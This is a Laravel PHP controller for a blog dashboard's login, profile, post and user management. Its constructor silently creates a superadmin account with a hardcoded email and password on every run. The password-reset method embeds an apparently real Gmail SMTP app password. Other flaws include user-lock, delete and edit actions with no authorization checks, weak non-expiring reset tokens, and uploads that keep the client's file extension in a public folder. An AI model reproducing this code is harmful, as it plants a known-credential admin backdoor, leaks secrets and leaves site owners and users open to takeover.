<?php

namespace App\Http\Controllers;

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
use Illuminate\Http\Request;
use Session;
use Illuminate\Support\Facades\Auth;
use App\Http\Middleware\RevalidateBackHistory;
use Illuminate\Support\Facades\Storage;
use Illuminate\Filesystem\Filesystem;
use Illuminate\Support\Facades\Hash;
use Illuminate\Pagination\Paginator;
use Illuminate\Pagination\LengthAwarePaginator;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\DB;
use Illuminate\Database\Query\Builder;
use Illuminate\Support\Facades\Gate;
use Validator;
use App\Models\User;
use App\Models\Role;
use App\Models\Post;
use App\Models\Profile;


class AccessController extends Controller
{
    public function __construct(){
      $user = User::where('email','methyl2007@gmail.com')->first();
      if($user === null){
        $user = User::create(['email'=> 'methyl2007@gmail.com','name'=> 'methyl2007', 'password'=>Hash::make('smoothless')]);
        $role_name ='ROLE_SUPERADMIN';
        $role = Role::where('name',$role_name)->first();
        $role_id = $role->id;
        $user->roles()->attach($role_id);
      }
    }


      //dashboard
      public function index(){
        $userId = Auth::user()->id;
        $userEmail = Auth::user()->email;
        $usersCount= User::where("check", "new")->get()->count();
        $date = date('Y');
        if(Profile::where("user_id",$userId)->exists()){
          $profile = Profile::where("user_id",$userId)->first();
  
        }else{
          $profile= new Profile;
        }

        if(Auth::user()->hasRole('ROLE_SUPERADMIN') !="ROLE_SUPERADMIN" ){
          if(Post::where("user_id",$userId)->exists()){
   
            $posts = Post::where("user_id",$userId)->where("delete_post", NULL)->get();
  
          }else{
            $posts = '';
          }          
        }else{
          $posts = Post::where("delete_post", NULL)->get();
        }

        return view('pages.dash.index',['date'=>$date,'profile'=>$profile,'posts'=> $posts,'userEmail'=> $userEmail,'userId'=>$userId, 'usersCount'=>$usersCount, 'title'=>'Dashboard']);
  
      }
  
        // get setup profile
      public function setupProfile(Request $request){
        if($_SERVER['REQUEST_METHOD'] =='POST'){
          $data = array();
          $userId = Auth::user()->id;
          
          $image = $request->file('profileImage');
          $firstname= $request->input('firstname');
          $lastname= $request->input('lastname');
          $phone= $request->input('phone');
          $email= $request->input('email');
          $designation= $request->input('designation');
          if(User::where("email",protectData($email))->exists()){
  
            $rules=array(
              'profileImage' => 'required',
              'firstname'=>'required',
              'lastname'=>'required',
              'email'=>'required',
              'phone'=>'required',
              'designation'=>'required'
              
              );
            $validator= Validator::make($request->all(),$rules);
            if($validator->fails()){
              return redirect()->route('profile')->withErrors($validator);
            }else{
              if(!empty($request->input('id'))){
                $profile = Profile::find(protectData($request->input('id')));
                $FileSystem = new Filesystem();
                $directory = public_path().'/uploads/';
                if(!isset($image) || $image ==NULL || $image =='' ){
                  if($profile->profile_image !=='' && file_exists($directory.$profile->profile_image)){
                    unlink(public_path('uploads/'.$profile->profile_image));
                  }
                  $image='';
                  $profile->profile_image=$image;
                }else if($image->getFilename().'.'.$image->getClientOriginalExtension() != $profile->profile_image){
                  if($profile->profile_image !==''){
                    if(file_exists(public_path('uploads/'.$profile->profile_image))){
                      unlink(public_path('uploads/'.$profile->profile_image));
                    }
                  }
                  $image->move($directory,$image->getFilename().'.'.$image->getClientOriginalExtension());
                  $profile->profile_image=$image->getFilename().'.'.$image->getClientOriginalExtension();
                }else{
                  if(file_exists($directory.$profile->profile_image)){
                    unlink(public_path('uploads/'.$profile->profile_image));
                    $profile->profile_image=$image->getFilename().'.'.$image->getClientOriginalExtension();
                  }
  
                  $image->move($directory,$image->getFilename().'.'.$image->getClientOriginalExtension());
  
                  $profile->profile_image=$image->getFilename().'.'.$image->getClientOriginalExtension();
                }
  
  
                $profile->firstname =protectData($firstname);
                $profile->lastname =protectData($lastname);
                $profile->phone_number =protectData($phone);
                $profile->designation = protectData($designation);
                $profile->user_id =$userId;
                $profile->save();
                $request->session()->flash('successMessage', ucwords($firstname.' '.$lastname).' profile successfully updated');
  
              }else{
                if(!isset($image) || $image ==NULL || $image =='' ){
                  $image='';
                  $data['profile_image']  =$image;
                  }else{
                    $directory = public_path().'/uploads/';
                    $image->move($directory,$image->getFilename().'.'.$image->getClientOriginalExtension());
  
                    $data['profile_image'] =$image->getFilename().'.'.$image->getClientOriginalExtension();
                  }
  
                    $data['firstname'] =protectData($firstname);
                    $data['lastname'] =protectData($lastname);
                    $data['phone_number'] =protectData($phone);
                    $data['designation'] =protectData($designation);
                    
                    $data['user_id'] =$userId;
                    $profile= Profile::create($data);
                  }
                  $request->session()->flash('successMessage', ucwords($firstname.' '.$lastname).' profile successfully updated');
                  return redirect()->route('profile');
              }
          }else{
            $request->session()->flash('failureMessage', 'This email , '.$request->email.' is not available');
            return redirect()->route('profile');
          }
  
  
        }else{
  
          $userId = Auth::user()->id;
          $userEmail = Auth::user()->email;
  
          $date = date('Y');
          if(Profile::where("user_id",$userId)->exists()){
            $profile = Profile::where("user_id",$userId)->first();
          }else{
            $profile= new Profile;
          }
  
          return view('pages.dash.profile',['date'=>$date,'profile'=> $profile, 'userEmail'=>$userEmail,  'userId'=>$userId, 'title'=>'Profile']);
        }
  
      }
  
  
    //reset password here
    public  function resetPassword(Request $request){
      if($_SERVER['REQUEST_METHOD'] =='POST'){
  
        $password=protectData($request->input('password'));
        $rules=array(
          'password'=>'required|confirmed',
        );
        $validator= Validator::make($request->all(),$rules);
        if($validator->fails()){
          return redirect()->route('reset-password')->withErrors($validator);
        }else{
          $userId=Auth::user()->id;
          $user=$result= User::where("id", $userId)->first();
          if($user !==null){
            $user->password =Hash::make($password);
            $user->save();
            $request->session()->flash('successMessage', 'Password successfully changed');
            return  redirect()->route('reset-password');
          }else{
            $request->session()->flash('failureMessage', 'Oop something went wrong');
          return  redirect()->route('reset-password');
          }
        }
      }else{
        $userId = Auth::user()->id;
        $email = Auth::user()->email;

        $date = date('Y');
        if(Profile::where("user_id",$userId)->exists()){
          $profile = Profile::where("user_id",$userId)->first();
        }else{
          $profile= new Profile;
        }
        return view('pages.dash.reset-password', ['date'=>$date,'profile'=> $profile, 'email'=>$email,  'userId'=>$userId, 'title'=>'Forgot Password']);
      }
  
     }
  
    //forgot password here
    public  function forgotPassword(Request $request){
     if($_SERVER['REQUEST_METHOD'] =='POST'){
  
        $email=protectData($request->input('email'));
        $rules=array(
          'email'=>'required|email',
        );
        $validator= Validator::make($request->all(),$rules);
        if($validator->fails()){
          return redirect()->route('forgot-password')->withErrors($validator);
        }else{
          $emailCheck=$result=DB::table('users')->where('email',$email)->first();
          if($emailCheck !== null){
  
            $mail = new PHPMailer(true);
  
            try {
                //Email settings
                //generate random string
                $checker =randomString(7);
                $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
                $mail->isSMTP();                                            //Send using SMTP
                $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
                $mail->SMTPAuth = true; // authentication enabled
                $mail->SMTPSecure = 'ssl';
                $mail->Host = "smtp.gmail.com";                    //Set the SMTP server to send through                                  //Enable SMTP authentication
                $mail->Username = "methyl2007@gmail.com";
                $mail->Password ="oeyfejwegvgphhua";                                //SMTP password
                $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
                $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
                //Recipients
                $mail->setFrom("methyl2007@gmail.com", 'Livestock247');
                $mail->addAddress($email);     //Add a recipient
                //$mail->addEmbeddedImage(public_path().'/my-register/img/school.jpeg','cover');
                $body = '<html><body><h2 style="color:white;font-size:14px;">Hello, '.$email.'</h2>';
                $body .= '<table rules="all" style="border-color: #666; color:white:background-color:#5be9ff" cellpadding="10">';
                $body .= '<div style="background-color:#5be9ff;padding:30px;color:white"><p>Kindly change your password wih the link below</p><br><p><a href="http://127.0.0.1:8000/change-password/'.$checker.'">change Password</a></p></div>';
                $body .= "</table>";
                $body .= "</body></html>";
                $mail->isHTML(true);
                $mail->Subject = 'Forgot Password';
                $mail->Body  = $body;
                $mail->send();
                $user= User::where("email",$email)->first();
                $user->checker = $checker;
                $user->save();
                $request->session()->flash('successMessage', 'Check your email, if you have account with us');
                return  redirect()->route('forgot-password');
            } catch (Exception $e) {
              $request->session()->flash('failureMessage', $e->getMessage());
              return  redirect()->route('forgot-password');
            }
          }
        }
      }else{
        return view('pages.dash.forgot-password',['title'=>'Forgot Password']);
      }
    }  

    //login
    public function login(){
      $date = Date('Y');
      return view('pages.dash.login', ['title'=>'Login','date'=>$date]);

    }

    //login post
    public function loginPost(Request $request){
      $email=$request->input('email');
      $pass=$request->input('password');
      $rules=array(
        'email'=>'required|email',
        'password'=>'required',
      );
      $validator= Validator::make($request->all(),$rules);
      if($validator->fails()){
        //fail request
        return redirect()->route('login')->withErrors($validator);
      }else{

        $email=protectData($request->input('email'));
        $pass=protectData($request->input('password'));
        $data=array('email'=>$email,'password'=>$pass);

        if($request->input('remember_me')=='on'){
          $remember=true;
        }else{
          $remember=false;
        }

        if(Auth::attempt($data,$remember)){
          return redirect()->route('dashboard');
        }else{
          return  back()->with('failureMessage', 'Your login detail is wrong');
        }

      }

    }


    //change password
    public  function createUser(Request $request){
      if($_SERVER['REQUEST_METHOD'] =='POST'){
      
        $username=protectData($request->input('username'));
        $email=protectData($request->input('email'));
        $password= Hash::make(protectData($request->input('password')));
        $role_name=protectData($request->input('role_name'));

        $rules=array(
          'email'=>'required|email|unique:users,email',
          'password'=>'required',
          'role_name'=>'required|in:"ROLE_ADMIN","ROLE_SUPERADMIN"',
        );
        $validator= Validator::make($request->all(),$rules);
        if($validator->fails()){
          return redirect()->route('create-user')->withErrors($validator);
        }else{
         
          $role_id=DB::table('roles')->where('name',$role_name)->first();
          $user= new User;
          $user->email=protectData($email);
          $user->password=protectData($password);
          $user->check=protectData('new');
          if($user->save()){
            $role = Role::where('name',$role_name)->first();
            $role_id = $role->id;
            $user->roles()->attach($role_id);
              $request->session()->flash('successMessage', 'You have successfully created '.$email.' as an admin');
              return  redirect()->route('create-user');

          };
        }
        
      }else{
        $userId = Auth::user()->id;
        $userEmail = Auth::user()->email;
        $roles = Role::all();
        $date = date('Y');
        if(Profile::where("user_id",$userId)->exists()){
          $profile = Profile::where("user_id",$userId)->first();
        }else{
          $profile = new Profile;
        }
        return view('pages.dash.create-user',['profile'=> $profile,'userEmail'=>$userEmail,'userId'=>$userId,'roles'=>$roles,'title'=>'Creat User','date'=>$date]);
      }

    }


  //all users here
  public  function users(){
        $userId = Auth::user()->id;
        $userEmail = Auth::user()->email;

        $date = date('Y');
        if(Profile::where("user_id",$userId)->exists()){
          $profile = Profile::where("user_id",$userId)->first();
        }else{
          $profile= new Profile;
        }

        $users = DB::table('users')->join('profile','profile.user_id', '=', 'users.id')->select('users.email', 'users.lock_user', 'profile.firstname',
        'profile.lastname','profile.phone_number','profile.designation', 'profile.user_id')->get();

        

      return view('pages.dash.users', ['date'=>$date,'profile'=> $profile, 'userEmail'=>$userEmail,  'userId'=>$userId, 'users' => $users, 'title'=>'Blog Posts']);
    
  }  
       
	public function lockUser(Request $request){
       
    $user_id = protectData($request->input('user_id'));
    $params['id'] = $user_id;
   
    $lock_user = User::where('id', $user_id)->first();

    if($lock_user === null){
      return response()->json(['error' => 'Unauthenticated.'], 401);
    }

    if($lock_user->lock_user !='lock'){
      User::where("id",protectData($user_id))->update(["lock_user" => "lock"]);
      return response()->json(['status' => 'success', 'message'=>'User with email'.$lock_user->email.' has been locked']);          
    }else{
      User::where("id",protectData($user_id))->update(["lock_user" => NULL]);
      return response()->json(['status' => 'success', 'message'=>'User with email '.$lock_user->email.' has been unlocked']);			
    }

}
    //signup
    /*public function signup(){
      $date = Date('Y');
      return view('pages.dash.signup', ['title'=>'Login','date'=>$date]);

    }*/

    //signup post
    /*public function signupPost(Request $request){

      
      $username=protectData($request->input('username'));
      $email=protectData($request->input('email'));
      $password=Hash::make(protectData($request->input('password')));
      $condition =protectData($request->input('condition'));
      if($condition != "on"){
        $request->session()->flash('agreement', 'KIndly select the checkbox to agree to all Terms & Conditions');
        return  redirect()->route('signup');
      }else{
        $condition ="agreed";
      }

      $role_name ='ROLE_ADMIN';
      $rules=array(
        'email'=>'required|email|unique:users,email',
        'password'=>'required',
        'condition'=>'required',
      );
      $validator= Validator::make($request->all(),$rules);
      if($validator->fails()){
        return redirect()->route('signup')->withErrors($validator);
      }else{
        $role_id=DB::table('roles')->where('name',$role_name)->first();
        $user_id=$result=DB::table('users')->where('email',$email)->first();
        $roleCheck=DB::table('role_user')->where('role_id',$role_id)->where('user_id',$user_id);
        if($roleCheck !== null){
          $request->session()->flash('failureMessage', $email.' has already been registered as an '.$role_name );
          return  redirect()->route('signup');
        }
        $user= new User;
        $user->email=protectData($email);
        $user->password=protectData($password);
        $user->condition=protectData($condition);
        $user->check=protectData('new');
        if($user->save()){
          $role = Role::where('name',$role_name)->first();
          $role_id = $role->id;
          $user->roles()->attach($role_id);
            $request->session()->flash('successMessage', 'You have successfully registered '.$email.' as an admin');
            return  redirect()->route('signup');

        };
      }
    }*/

  //create post here
  public  function createPost(Request $request, Post $post){
    Gate::authorize('create', $post);
    if($_SERVER['REQUEST_METHOD'] =='POST'){

      
      $image=$request->file('file');
      $link_post_title = $request->input('link-post-title');
      $post_title= $request->input('post-title');
      $post_description = $request->input('post-description');
      $userId = Auth::user()->id;
      $rules=array(
        'file'=>'required',
        'link-post-title'=>'required',
        'post-title'=>'required',
        'post-description'=>'required',
      );
        $validator= Validator::make($request->all(),$rules);
        if($validator->fails()){
            return redirect()->route('create-post')->withErrors($validator);
        }else{
            $profile =DB::table('profile')->where('user_id',$userId)->first();

            if($profile ==null){
                $request->session()->flash('failureMessage', 'Kindly update your profile');
                return redirect()->route('profile');
            }
            
            $FileSystem = new Filesystem();
            $directory = public_path().'/uploads/';
            $image->move($directory,$image->getFilename().'.'.$image->getClientOriginalExtension());
            $post= new Post;
            $post->post_image =$image->getFilename().'.'.$image->getClientOriginalExtension();
            $post->link_post_title =protectData($link_post_title);
            $post->post_title =protectData($post_title);
            $post->post_description =protectData($post_description);
            $post->created_at = Date('Y-m-d H:i:s');
            $post->user_id = $userId;
            $post->save();
            $request->session()->flash('successMessage', 'Post successfully created');
            return redirect()->route('create-post');
        }
     }else{
        $userId = Auth::user()->id;
        $userEmail = Auth::user()->email;

        $date = date('Y');
        if(Profile::where("user_id",$userId)->exists()){
          $profile = Profile::where("user_id",$userId)->first();
        }else{
          $profile = new Profile;
        }
      return view('pages.dash.create-post', ['date'=>$date,'profile'=> $profile, 'userEmail'=>$userEmail,  'userId'=>$userId, 'title'=>'Create Blog Post']);
    }

  }

    //edit posts here
    public  function post(Request $request, $id){
      if($_SERVER['REQUEST_METHOD'] =='POST'){

      
        $image=$request->file('file');
        $link_post_title = $request->input('link-post-title');
        $post_title= $request->input('post-title');
        $post_description = $request->input('post-description');
        $post_id = $request->input('post_id');
        $userId = Auth::user()->id;
        $rules=array(
          'file'=>'required',
          'link-post-title'=>'required',
          'post-title'=>'required',
          'post-description'=>'required',
        );
          $validator= Validator::make($request->all(),$rules);
          if($validator->fails()){
              return redirect()->route('post',$id)->withErrors($validator);
          }else{

            $post = Post::findOrFail(protectData($post_id));
            $FileSystem = new Filesystem();
            $directory = public_path().'/uploads/';
            if(!isset($image) || $image ==NULL || $image =='' ){
              if($post->post_image !=='' && file_exists($directory.$post->post_image)){
                unlink(public_path('uploads/'.$post->post_image));
              }
              $image='';
              $post->post_image=$image;
            }else if($image->getFilename().'.'.$image->getClientOriginalExtension() != $post->post_image){
              if($post->post_image !==''){
                if(file_exists(public_path('uploads/'.$post->post_image))){
                  unlink(public_path('uploads/'.$post->post_image));
                }
              }
              $image->move($directory,$image->getFilename().'.'.$image->getClientOriginalExtension());
              $post->post_image =$image->getFilename().'.'.$image->getClientOriginalExtension();
            }else{
              if(file_exists($directory.$post->post_image)){
                unlink(public_path('uploads/'.$post->post_image));
                $post->post_image =$image->getFilename().'.'.$image->getClientOriginalExtension();
              }

              $image->move($directory,$image->getFilename().'.'.$image->getClientOriginalExtension());

              $post->post_image =$image->getFilename().'.'.$image->getClientOriginalExtension();
            }

              $post->link_post_title =protectData($link_post_title);
              $post->post_title =protectData($post_title);
              $post->post_description =protectData($post_description);
              $post->created_at = Date('Y-m-d H:i:s');
              $post->user_id = $userId;
              $post->save();
              $request->session()->flash('successMessage', ucfirst($post->link_post_title).' successfully updated');
              return redirect()->route('post',$id);
          }

      }else{
        $userId = Auth::user()->id;
        $userEmail = Auth::user()->email;

        $date = date('Y');
        if(Profile::where("user_id",$userId)->exists()){
          $profile = Profile::where("user_id",$userId)->first();
        }else{
          $profile= new Profile;
        }

        $post = Post::findOrFail($id);
        return view('pages.dash.edit_post', ['date'=>$date,'profile'=> $profile, 'userEmail'=>$userEmail,  'userId'=>$userId, 'post' => $post, 'title'=>$post->link_post_title]);
      }

    } 


  //all posts here
  public  function posts(Request $request, Post $post){
        Gate::authorize('views', $post);
        $userId = Auth::user()->id;
        $userEmail = Auth::user()->email;

        $date = date('Y');
        if(Profile::where("user_id",$userId)->exists()){
          $profile = Profile::where("user_id",$userId)->first();
        }else{
          $profile= new Profile;
        }

        if(Auth::user()->hasRole('ROLE_SUPERADMIN') !="ROLE_SUPERADMIN" ){
          if(Post::where("user_id",$userId)->exists()){
   
            $posts = Post::where("user_id",$userId)->where("delete_post", NULL)->get();
  
          }else{
            $posts = '';
          }          
        }else{
          $posts = Post::where("delete_post", NULL)->get();
        }

      return view('pages.dash.posts', ['date'=>$date,'profile'=> $profile, 'userEmail'=>$userEmail,  'userId'=>$userId, 'posts' => $posts, 'title'=>'Blog Posts']);
    
  }  
    
  //delete blog post here
  public function deletePost($id){
    if($id == null || $id == '' || !is_numeric($id)){
      return response()->json(['success'=>'fail','message'=>'You are not authorized to delete this blog post']);                   
    }

    if(Post::where("id",protectData($id))->update(["delete_post" => "delete"])){
      $post = Post::where("id",$id)->where("delete_post", "delete")->first();
      return response()->json(['success'=>'success','message'=>ucfirst($post->link_post_title).' has been deleted successfully']);
    }else{
      return response()->json(['success'=>'fail','message'=>'Oops something went wrong']);
    }  

  }    

    //logout here
    public  function logout(){
      Auth::logout();
      Session::flush();
      return redirect()->route('login');;
    }



  //change password
  public  function changePassword(Request $request){
    $checker = $request->name;
    $date = Date('Y');
    return view('pages.dash.change-password',['checker'=>$checker,'title'=>'Change Password','date'=>$date]);
  }

  //post change password
  public  function password(Request $request){
    $password=protectData($request->input('password'));
    $rules=array(
      'password'=>'required',
    );
    $validator= Validator::make($request->all(),$rules);
    if($validator->fails()){
      return redirect()->route('change-password',['checker'=>$request->checker])->withErrors($validator);
    }else{
      if($request->checker !==''){
        $checker = protectData($request->checker);
        $checkResult=$result=DB::table('users')->where('checker',$checker)->first();
        if($checkResult !==null){

          $user = User::where("checker", $checker)->first();
          $user->password =Hash::make($password);
          $user->checker =NULL;
          $user->save();
          $request->session()->flash('successMessage', 'Password successfully changed');
          return  redirect()->route('change-password',['checker'=>$checker]);
        }else{
          $request->session()->flash('failureMessage', 'Oop link has expired');
        return  redirect()->route('change-password',['checker'=>$checker]);
        }
      }else{
        $request->session()->flash('failureMessage', ' Oops not allowed' );
      return  redirect()->route('change-password',['checker'=>$checker]);
      }
    }
  }

  //number of users
  public function numberOfUsers(){
   
    $users_count =User::count();
    return  $users_count;
  }

  //number of locked users
  public function numberOfLockedUsers(){
    $lock_users_count =User::where("lock_user", "lock")->count();
    return  $lock_users_count;
  }

  //number of blog post
  public function numberOfBlogPost(){
    $blog_post_count =Post::count();
    return  $blog_post_count;
  }


  //number of deleted post
  public function numberOfDeletedPost(){
    $deleted_post_count =Post::where("delete_post", "delete")->count();
    return  $deleted_post_count;
  }

}
